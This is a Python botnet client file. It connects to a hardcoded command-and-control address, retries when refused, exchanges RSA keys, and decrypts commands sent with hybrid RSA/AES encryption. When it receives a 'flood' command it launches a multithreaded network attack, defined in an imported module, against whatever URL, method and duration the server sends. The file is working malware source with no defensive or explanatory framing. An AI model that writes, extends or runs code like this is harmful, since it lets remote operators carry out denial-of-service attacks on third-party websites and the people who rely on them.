import socket
import logging
import time
import json

from .hybrid import HybridCrypto
from . import parse_url, NetTools

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%H:%M:%S')

class Client:
    def __init__(self, server_host='192.168.1.120', server_port=547):
        self.server_host = server_host
        self.server_port = server_port
        self.crypto = HybridCrypto()
        self.private_key, self.public_key = self.crypto.generate_rsa_keys()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.running = True 

    def _load_server_public_key(self, path):
        with open(path, "rb") as f:
            pem = f.read()
        return self.crypto.load_public_key(pem)

    def connect(self):
        while self.running:
            try:
                self.sock.connect((self.server_host, self.server_port))

                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    raise ConnectionError("Failed to receive server public key length")
                server_pubkey_len = int.from_bytes(length_bytes, 'big')

                server_pubkey_pem = self._recv_n_bytes(server_pubkey_len)
                if not server_pubkey_pem:
                    raise ConnectionError("Failed to receive server public key")
                self.server_public_key = self.crypto.load_public_key(server_pubkey_pem)
                logging.info("Received server public key")

                pubkey_pem = self.crypto.serialize_public_key(self.public_key)
                self.sock.send(len(pubkey_pem).to_bytes(2, 'big') + pubkey_pem)
                logging.info(f"Sent public key to server ({self.server_host}:{self.server_port})")

                self._listen_server()
                
            except (ConnectionRefusedError, TimeoutError, ConnectionError, OSError) as e:
                logging.warning(f"Connection failed. Retrying in 5 seconds...")
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                time.sleep(5)
            except Exception as e:
                logging.error(f"Unexpected error during connection: {e}")
                break

    def _listen_server(self):
        try:
            while True:
                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    logging.info("Server closed connection")
                    break
                encrypted_session_key_len = int.from_bytes(length_bytes, 'big')

                encrypted_session_key = self._recv_n_bytes(encrypted_session_key_len)
                if not encrypted_session_key:
                    logging.warning("Disconnected during session key reception")
                    break

                length_bytes = self._recv_n_bytes(2)
                if not length_bytes:
                    logging.warning("Disconnected during message length reception")
                    break
                encrypted_msg_len = int.from_bytes(length_bytes, 'big')

                encrypted_msg = self._recv_n_bytes(encrypted_msg_len)
                if not encrypted_msg:
                    logging.warning("Disconnected during message reception")
                    break

                session_key = self.crypto.rsa_decrypt(self.private_key, encrypted_session_key)
                message = self.crypto.aes_decrypt(session_key, encrypted_msg).decode()

                logging.info(f"Received message: {message}")
                
                encrypted_ack = self.crypto.rsa_encrypt(self.server_public_key, b"ACK")
                self.sock.send(len(encrypted_ack).to_bytes(2, 'big') + encrypted_ack)
                logging.info("Sent ACK to server")

                msg_json = json.loads(message)

                if msg_json["action"] == "flood":
                    NetTools().run_attack(parse_url(msg_json["data"]["url"]), int(msg_json["data"]["duration"]), msg_json["data"]["method"], int(msg_json["data"]["threads"]))
                if msg_json["action"] == "ack":
                    pass

        except Exception as e:
            logging.error(f"Error in listening thread: {e}")
        finally:
            self.sock.close()
            logging.info("Connection closed")
    
    def _recv_n_bytes(self, n):
        data = b''
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def close(self):
        self.sock.close()
